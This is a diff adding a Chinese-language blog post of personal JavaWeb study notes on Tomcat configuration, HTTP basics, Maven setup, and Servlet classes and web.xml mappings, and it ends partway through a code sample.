@@ -164,6 +164,502 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-JavaWeb笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/21/JavaWeb%E7%AC%94%E8%AE%B0/">JavaWeb笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/21/JavaWeb%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-01-21T05:10:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.1 web开发：<br>静态web：html，css。提供给所有人看的数据始终不会发生变化<br>动态web：常用技术栈：Servlet/JSP，ASP，PHP。我的理解：不同账号看到的信息不同。</p>
+<p>在Java中，动态web次元开发的技术统称为JavaWeb</p>
+<p>1.2 web应用程序<br>web应用程序：可以提供浏览器访问的程序；</p>
+<p>1.3 静态web<br>*.htm、*.htm</p>
+<p>缺点：无法动态更新<br>    轮播图：点击特效：伪动态<br>    JavaScript、VBScript<br>    无法和数据库交互</p>
+<p>1.4 动态web</p>
+<p>2.1 web服务器<br>ASP：微软：国内最早流行的。在HTML中嵌入了VB的脚本，ASP+COM。在ASP开发中，基本上一个页面都有几千行的业务逻辑代码，页面极其混乱，维护成本高（重构成本高）。C#。IIS服务器。<br>PHP：PHP开发速度很快，功能很强大，跨平台，代码很简单。无法承载大访问量的情况下（如果淘宝用PHP，双十一一天几亿的并发，秒炸），所以局限在中小型网站（占中国70%左右）<br>JSP/Servlet：sun公司开发。B/S架构：浏览器和服务器。基于Java语言的，所有大公司，或者一些开源组件，都是用Java写的。可以承载三高问题带来的影响。语法像ASP。</p>
+<p>2.2 web服务器<br>IIS（微软）（Windows自带的和WebLog等）<br>Tomcat<br>    文件目录：<br>        bin：启动，关闭的脚本文件<br>        conf：配置<br>        lib：以来的jar包<br>        logs：日志<br>        webapps：存放网站<br>    启动、关闭tomcat<br>    startup.bat<br>    shutdown.bat<br>    (有时候会报错没有JAVA_HOME，就现在用户环境下建一个JAVA_HOME，然后在系统变量的Path下放一个%JAVA_HOME%)（或者直接改bat里的路径，但是会影响idea）</p>
+<p>3.1目录：<br>conf：配置<br>    server.xml:服务器核心配置<br>        Connector：改端口（默认8080）<br>        Host（不要碰Engine！）：改name能改访问的域名（原来为localhost），但是并没有改域名解析，所以暂时是无法访问的，可以改C:\Windows\System32\drivers\hosts可以解析上去（phpstudy应该就是这样做的），但不建议。改appBase可以修改网站目录<br>logs：日志（非常重要，可以看所有的传包的GET传参内容）<br>webapps：网站目录<br>    ROOT：根目录<br>        WEB-INF：下面有和web.xml。这个是安全目录，客户端无法访问，只有服务端可以访问的目录（可以把很多后端脚本扔进去，防止被访问到）。<br>    访问顺序：如果访问index/这个目录，会先检索webapps目录，如果有index目录则访问其中的index.*，如果没有会检索ROOT目录的index目录<br>    examples：例子目录（有大量源码，用于学习）<br>    docs：tomcat的帮助文档<br>    manager和host-manager：管理页面，需要登录</p>
+<p>4.1 HTTP<br>HTTP/1.0<br>HTTP/1.1</p>
+<p>头部参数（消息）<br>Accept：告诉浏览器所支持的数据类型<br>Accept-Encoding：支持哪种编码格式（GBK，UTF-8）<br>Accept-language：语言环境<br>Cache-Control：缓存控制<br>Connection：告诉浏览器请求完成是断开还是保持连接<br>HOST：主机<br>Refresh:多久刷新一次<br>Location：让网页重新定位</p>
+<p>200：成功<br>3xx：重定向<br>4xx：资源不存在<br>5xx：服务器代码错误（502：网关错误）</p>
+<p>5.Maven<br>为什么学习这个技术：<br>    1.在Javaweb开发中，需要使用大量的jar包，我们手动去导入<br>    2.如何能够让一个东西自动帮我们导入并配置这个jar包<br>5.1 Maven项目架构管理工具<br>目前用来导入jar包<br>核心思想：约定大于配置<br>    有约束，不要去违反<br>Maven会规定好你该如何去编写我们的java代码，必须按照这个规范来<br>5.2安装Maven<br>下载zip包解压<br>然后配置镜像（mirror），不然下的死慢<br>配阿里云，从网上搜maven阿里云镜像，然后把一整格mirror标签扔进mirrors标签里</p>
+<p>5.3配置环境变量<br>系统变量：<br>    M2_HOME maven的bin目录<br>    MAVEN_HOME maven的目录<br>    Path中 maven的bin目录<br>测试：<code>mvn -version</code></p>
+<p>5.4 本地仓库<br>新建文件加maven-repo<br>在settings票签下建一个localRepository标签，然后把路径放进去<br>更新仓库</p>
+<p>5.5 在IDEA中使用Maven<br>1.启动IDEA<br>2.创建一个Maven项目</p>
+<p>5.6 在IDEA中使用MAVEN<br>1.启动IDEA<br>2.创建一个MavenWeb项目（勾选Create from archetype可以使用Maven的模板）<br>（选中maven-archetype-webapp，点击next，创建组和名，next，path选中maven，finish）<br>IDEA项目创建成功后，看一眼Maven的配置</p>
+<p>5.7 创建一个普通的Maven项目<br>不勾选，直接走下一步（没有选仓库的位置，容易出问题，要改setting下的目录）</p>
+<p>src目录下：<br>    main：<br>        java：放置java源代码<br>        resources：放置配置文件<br>    test：<br>        java：测试使用</p>
+<p>刚刚创建的Maven：<br>main：<br>    webapp：<br>        WEB-INF<br>        index.jsp<br>所以要在main下加java和resources文件夹，然后标记java为源码目录，就可以创建class文件了，将resources目录标记为资源目录</p>
+<p>5.8 在IDEA中配置Tomcat<br>1.点击右上角的“添加配置”，点击“+”<br>2.找到并选择Tomcat，用本地<br>3.名称：服务器启动名称，随便配<br>浏览器：<br>JRE：配java环境<br>端口：Tomcat的端口</p>
+<p>底下会报错：未指定应用服务器。<br>是因为没选择tomcat目录<br>然后转到“部署”，点“+”，“工件”，新建第一个</p>
+<p>4.启动Tomcat</p>
+<p>访问端口就会显示index.jsp的内容</p>
+<p>5.9 Maven侧边栏<br>点开右侧的Maven<br>“生命周期”下是Maven的命令行操作<br>“插件”：甚至可以删掉<br>“项目依赖”</p>
+<p>5.10 pom文件<br>pom.xml 是Maven的核心配置文件<br>Maven版本和头文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--Maven版本和头文件--&gt;</span><br><span class="line">&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line">  &lt;!--这里是刚刚配置的GAV--&gt;</span><br><span class="line">  &lt;groupId&gt;com.kuang&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javaweb-01-maven&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt;</span><br><span class="line">  &lt;!--Package：项目的打包方式</span><br><span class="line">  jar：java应用</span><br><span class="line">  war：JavaWeb应用--&gt;</span><br><span class="line">  &lt;packaging&gt;war&lt;&#x2F;packaging&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--name可删--&gt;</span><br><span class="line">  &lt;name&gt;javaweb-01-maven Maven Webapp&lt;&#x2F;name&gt;</span><br><span class="line">  &lt;!-- FIXME change it to the project&#39;s website --&gt;</span><br><span class="line">  &lt;url&gt;http:&#x2F;&#x2F;www.example.com&lt;&#x2F;url&gt;</span><br><span class="line">  &lt;!--配置--&gt;</span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;!--项目的默认构建编码--&gt;</span><br><span class="line">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;&#x2F;project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;!--编码版本--&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;1.7&lt;&#x2F;maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;1.7&lt;&#x2F;maven.compiler.target&gt;</span><br><span class="line">  &lt;&#x2F;properties&gt;</span><br><span class="line">  &lt;!--项目依赖，可删--&gt;</span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;!--具体依赖的jar包配置--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;&#x2F;groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.11&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;scope&gt;test&lt;&#x2F;scope&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">  &lt;&#x2F;dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--项目构建用的东西--&gt;</span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    &lt;!--名字可删--&gt;</span><br><span class="line">    &lt;finalName&gt;javaweb-01-maven&lt;&#x2F;finalName&gt;</span><br><span class="line">    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span><br><span class="line">      &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-clean-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.1.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;!-- see http:&#x2F;&#x2F;maven.apache.org&#x2F;ref&#x2F;current&#x2F;maven-core&#x2F;default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-resources-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.0.2&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.8.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-surefire-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.22.1&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-war-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.2.2&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-install-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.5.2&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-deploy-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;version&gt;2.8.2&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;plugin&gt;</span><br><span class="line">      &lt;&#x2F;plugins&gt;</span><br><span class="line">    &lt;&#x2F;pluginManagement&gt;</span><br><span class="line">  &lt;&#x2F;build&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>
+<p>Maven的高级之处在于它会帮你导入这个jar包所依赖的其他jar包</p>
+<p>Maven由于约定大于配置，所以之后有可能会遇到自己写的配置文件，无法被导出或者生效的问题，解决方案：在build下面加一个resources（可以百度：Maven资源导出问题）</p>
+<p>Maven右边栏打开后在最上行有一个“显示依赖项”，点击后可以生成目录的树，直接显示所有jar包的依赖关系（比如一个包出问题了，可以显示会影响到哪些包）</p>
+<p>6.Servlet<br>6.1 Servlet简介<br>    sun公司开发动态web的一门技术<br>    sun公司在这些API中提供了一个接口叫：Servlet，如果想开发一个Servlet程序，只需要完成两个步骤：<br>        编写一个来，实现Servlet接口<br>        把开发好的Java类部署到Web服务器中<br>    把实现了Servlet接口的Java程序叫做Servlet</p>
+<p>6.2 HelloServlet<br>1.构建一个普通的Maven项目，删掉src目录，以后学习就在这个项目里建立Module;这个空的工程就是Maven的主工程（记得先把Maven的目录配置了）<br>2.导入依赖（百度：Maven Servlet jsp依赖）（Tomcat10+的依赖变为jakarta.servlet）（最好直接去Maven官网搜servlet API，jsp API）（貌似也搜到了tomcat Servlet API和tomcat jsp API）（询问过群里师傅发现，tomcat10是支持Servlet5.0版本的，但是servlet API只到4.0.1，所以只能用tomcat-servlet API）</p>
+<p>快捷键：alt+ins：调出重写等选项的框<br>alt+enter：引入局部变量</p>
+<p>3.新建一个module<br>Maven选webapp</p>
+<p>4.编写一个类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.servlet;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import jakarta.servlet.ServletException;</span><br><span class="line">import jakarta.servlet.http.HttpServlet;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line">public class HelloServlet extends HttpServlet &#123;</span><br><span class="line">    &#x2F;&#x2F;重写方法</span><br><span class="line">    &#x2F;&#x2F;由于GET和POST只是请求实现的不同方式，所以可以互相调用，因为业务逻辑都一样</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;进入doGet方法&quot;);</span><br><span class="line">        &#x2F;&#x2F;ServletOutputStream outputStream &#x3D; resp.getOutputStream();</span><br><span class="line">        PrintWriter writer &#x3D; resp.getWriter();&#x2F;&#x2F;响应流</span><br><span class="line">        writer.print(&quot;HEllo,Servlet&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        super.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>5.编写Servlet的映射<br>    为什么要映射？<br>    我们写的是java程序，但是要通过浏览器访问，而浏览器需要连接web服务器，所以我们需要在web中注册我们写的Servlet，还需要给他一个浏览器能够访问的路径（修改web.xml）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee</span><br><span class="line">         http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">        version&#x3D;&quot;4.0&quot;</span><br><span class="line">        metadata-complete&#x3D;&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--注册Servlet--&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.kuang.servlet.HelloServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br><span class="line">    &lt;!--Servlet的请求路径--&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>6.配置tomcat<br>一定要在“工件”里导入war包！！！（第一次没有这个选项就重启idea）</p>
+<p>7.启动测试<br>如果是tomcat10的话直接用Servlet的api会500，只能用tomcat-Servlet的api（或者jakarta.servlet.api，换名字了）（参考版本对比表）（需要删掉原api，重新调用）<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49500992/article/details/108452815">https://blog.csdn.net/m0_49500992/article/details/108452815</a></p>
+<p>6.3 Servlet原理</p>
+<p>6.4 Mapping<br>1.一个Servlet可以指定一个映射路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>2.一个Servlet可以指定多个映射路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;hello2&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>3.一个Servlet可以指定通用的映射路径（通配符*）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;hello&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>特例：因为优先级更高，所以会直接覆盖index.jsp（少用）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>4.指定一些后缀或前缀等等（可能会报错，<code>*</code>前面不能加项目映射的路径，包括<code>/</code>,意思是以这个结尾的所有路径）(很多网页都用do，是以前遗留的问题)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.qinjiang&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>5.重写404页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.servlet;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.ServletException;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;自己写报错页面</span><br><span class="line">public class ErrorServlet extends HelloServlet&#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        resp.setCharacterEncoding(&quot;utf-8&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter writer &#x3D; resp.getWriter();</span><br><span class="line">        writer.print(&quot;&lt;h1&gt;404&lt;404&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--404--&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;error&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.kuang.servlet.ErrorServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;&#x2F;servlet&gt;</span><br><span class="line">&lt;!--Servlet的请求路径--&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;error&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>（理论上也包含了hello，但是并不影响，因为优先级问题）<br>6.优先级问题<br>置顶了固有的映射路径优先级更高（hello），如果找不到就会走默认的处理请求（通配符）</p>
+<p>6.5 ServletContext<br>部署时保证war包只有一个，不然会重新打包一遍</p>
+<p>web容器在启动的时候，它回味每个web程序都创建一个对应的ServletContext对象，它代表了当前的web应用<br>应用：<br>(1)共享数据<br>    我在这个Servlet保存的数据，可以在另外一个Servlet中拿到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.servlet;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.ServletContext;</span><br><span class="line">import jakarta.servlet.ServletException;</span><br><span class="line">import jakarta.servlet.http.HttpServlet;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class HelloServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        &#x2F;&#x2F;this.getInitParameter() 初始化参数</span><br><span class="line">        &#x2F;&#x2F;this.getServletConfig() 配置</span><br><span class="line">        &#x2F;&#x2F;this.getServletContext() 上下文</span><br><span class="line">        ServletContext context &#x3D; this.getServletContext();</span><br><span class="line">        String username&#x3D;&quot;scr&quot;;&#x2F;&#x2F;数据</span><br><span class="line">        context.setAttribute(&quot;username&quot;,username);&#x2F;&#x2F;将一个数据保存在一个servletcontext中</span><br><span class="line">        System.out.println(&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.servlet;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.ServletContext;</span><br><span class="line">import jakarta.servlet.ServletException;</span><br><span class="line">import jakarta.servlet.http.HttpServlet;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class GetServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span 